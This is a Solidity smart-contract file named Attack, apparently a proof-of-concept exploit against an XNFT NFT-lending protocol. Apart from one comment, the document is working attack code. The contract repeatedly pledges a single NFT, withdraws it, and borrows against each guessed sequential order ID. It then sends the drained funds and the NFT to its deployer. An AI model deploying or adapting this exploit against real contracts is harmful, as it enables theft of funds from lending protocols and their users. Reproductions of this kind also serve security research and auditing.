// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "./xnft/01_20_XNFT.sol";

contract Attack is IERC721ReceiverUpgradeable{
    XNFT xnft;
    IXToken xtoken;
    IERC721Upgradeable bayc;
    address collector;
    uint256 tokenId;
    uint256 amount;
    address payable admin;
    
    constructor(address payable _xnft, address _xtoken, address _collector, uint256 _tokenId, uint256 _amount){
        xnft = XNFT(_xnft);
        xtoken = IXToken(_xtoken);
        tokenId = _tokenId;
        collector = _collector;
        amount = _amount;
        admin = payable(msg.sender);
        bayc = IERC721Upgradeable(_collector);
    }

    // the target contract uses sequential orderIds, so we can guess the next orderId
    // and use one function to attack
    function attack(uint256 _orderId, uint256 count) external onlyAdmin{
        uint256 orderId = _orderId;
        for (uint256 i=0; i<count; i++){
            pledge();
            borrow(orderId);
            orderId = orderId +1;
        }
    }

    function pledge() public onlyAdmin{
        bayc.approve(address(xnft), tokenId);
        xnft.pledge721(collector, tokenId);
    }
    
    function borrow(uint256 orderId) public onlyAdmin{
        xnft.withdrawNFT(orderId);
        xtoken.borrow(orderId, payable(address(this)), amount);
    }

    receive () external payable {}  

    function withdraw() public onlyAdmin{
        (bool success, )  = admin.call{value: address(this).balance}("");
        require(success, "Transfer failed");
        bayc.transferFrom(address(this), admin, tokenId);
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "require admin auth");
        _;
    }

     function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
         return this.onERC721Received.selector;
    }
}
